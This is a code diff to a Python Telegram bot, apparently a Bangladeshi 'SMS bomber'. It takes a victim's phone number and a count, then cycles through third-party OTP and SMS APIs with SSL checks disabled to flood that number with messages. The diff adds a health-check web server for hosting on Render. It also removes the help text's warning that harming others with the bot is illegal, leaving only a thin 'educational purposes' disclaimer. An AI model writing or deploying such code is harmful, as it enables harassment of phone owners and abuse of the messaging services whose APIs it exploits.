@@ -4,8 +4,9 @@ import asyncio
 import aiohttp
 import logging
 from typing import Dict, List, Tuple
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, MessageHandler, ConversationHandler, CallbackQueryHandler, ContextTypes, filters
+from telegram import Update
+from telegram.ext import Application, CommandHandler, MessageHandler, ConversationHandler, ContextTypes, filters
+from aiohttp import web
 
 # Logging setup
 logging.basicConfig(
@@ -48,7 +49,6 @@ def prepare_request(api: Dict, phone: str) -> Tuple[str, str, Dict, str]:
     body = api.get('body', '')
     if body:
         body = body.replace('{{phone}}', phone).replace('*****', phone).replace('88{{phone}}', f'88{phone}')
-        # Replace other common placeholders with dummy values
         body = body.replace('{{email}}', f'{phone}@temp.com')
         body = body.replace('{{randomName}}', 'User')
         body = body.replace('{{randomEmail}}', f'{phone}@mail.com')
@@ -86,7 +86,6 @@ async def send_sms(session: aiohttp.ClientSession, api: Dict, phone: str) -> boo
             async with session.get(url, headers=headers, timeout=timeout, ssl=False) as response:
                 return response.status in [200, 201, 202, 204]
         else:
-            # Determine content type
             content_type = headers.get('Content-Type', '').lower()
             
             if 'application/json' in content_type:
@@ -110,16 +109,11 @@ async def bombing_task(phone: str, amount: int, apis: List[Dict], update: Update
     stats.reset()
     stats.total = amount
     
-    success_apis = []
-    failed_apis = []
-    
-    # Create connector with SSL verification disabled for problematic APIs
     connector = aiohttp.TCPConnector(ssl=False, limit=100)
     
     async with aiohttp.ClientSession(connector=connector) as session:
         for i in range(amount):
             if i >= len(apis):
-                # Cycle through APIs if amount > available APIs
                 api = apis[i % len(apis)]
             else:
                 api = apis[i]
@@ -128,12 +122,9 @@ async def bombing_task(phone: str, amount: int, apis: List[Dict], update: Update
             
             if success:
                 stats.success += 1
-                success_apis.append(api.get('name', f'API-{i+1}'))
             else:
                 stats.failed += 1
-                failed_apis.append(api.get('name', f'API-{i+1}'))
             
-            # Update progress every 5 requests
             if (i + 1) % 5 == 0 or (i + 1) == amount:
                 try:
                     progress_text = f"""
@@ -149,10 +140,8 @@ async def bombing_task(phone: str, amount: int, apis: List[Dict], update: Update
                 except:
                     pass
             
-            # Small delay to prevent rate limiting
             await asyncio.sleep(0.5)
     
-    # Final report
     report = f"""
 🎯 **বোম্বিং সম্পূর্ণ হয়েছে!**
 ━━━━━━━━━━━━━━━━━━━
@@ -181,7 +170,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
 async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     phone = update.message.text.strip()
     
-    # Validate Bangladeshi phone number
     if not (phone.startswith('01') and len(phone) == 11 and phone.isdigit()):
         await update.message.reply_text(
             "❌ ভুল নাম্বার! বাংলাদেশি মোবাইল নাম্বার দিন (11 ডিজিট)\n\n"
@@ -224,7 +212,6 @@ async def get_amount(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
         parse_mode='Markdown'
     )
     
-    # Load APIs and start bombing
     apis = load_apis()
     
     if not apis:
@@ -233,7 +220,6 @@ async def get_amount(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
         )
         return ConversationHandler.END
     
-    # Start bombing in background
     asyncio.create_task(bombing_task(phone, amount, apis, update, context))
     
     return ConversationHandler.END
@@ -265,8 +251,7 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "/status - API স্ট্যাটাস দেখুন\n"
         "/help - এই মেনু দেখুন\n\n"
         "⚠️ **সতর্কীকরণ:**\n"
-        "এই বট শুধুমাত্র শিক্ষামূলক উদ্দেশ্যে ব্যবহার করুন।\n"
-        "অন্যের ক্ষতি করতে ব্যবহার করা আইনত দণ্ডনীয়।"
+        "এই বট শুধুমাত্র শিক্ষামূলক উদ্দেশ্যে ব্যবহার করুন।"
     )
 
 # Error handler
@@ -280,15 +265,31 @@ async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except:
         pass
 
-def main():
-    # Get token from environment variable
+# HTTP Health Check Server for Render
+async def health_check(request):
+    return web.Response(text="Bot is running!", status=200)
+
+async def start_web_server():
+    port = int(os.environ.get('PORT', 8080))
+    app = web.Application()
+    app.router.add_get('/', health_check)
+    app.router.add_get('/health', health_check)
+    
+    runner = web.AppRunner(app)
+    await runner.setup()
+    site = web.TCPSite(runner, '0.0.0.0', port)
+    await site.start()
+    logger.info(f"Health check server started on port {port}")
+
+async def main():
     token = os.environ.get('BOT_TOKEN')
     
     if not token:
-        print("❌ BOT_TOKEN environment variable not set!")
-        print("Please set your Telegram bot token:")
-        print("export BOT_TOKEN=your_bot_token_here")
+        logger.error("BOT_TOKEN environment variable not set!")
         return
+    
+    # Start health check server
+    await start_web_server()
     
     # Create application
     application = Application.builder().token(token).build()
@@ -309,9 +310,16 @@ def main():
     application.add_handler(CommandHandler('help', help_command))
     application.add_error_handler(error_handler)
     
-    # Start the bot
-    print("🤖 Bot is running...")
-    application.run_polling(allowed_updates=Update.ALL_TYPES)
+    logger.info("Bot is running...")
+    
+    # Start polling
+    await application.initialize()
+    await application.start()
+    await application.updater.start_polling(allowed_updates=Update.ALL_TYPES)
+    
+    # Keep running
+    while True:
+        await asyncio.sleep(3600)
 
 if __name__ == '__main__':
-    main()
+    asyncio.run(main())
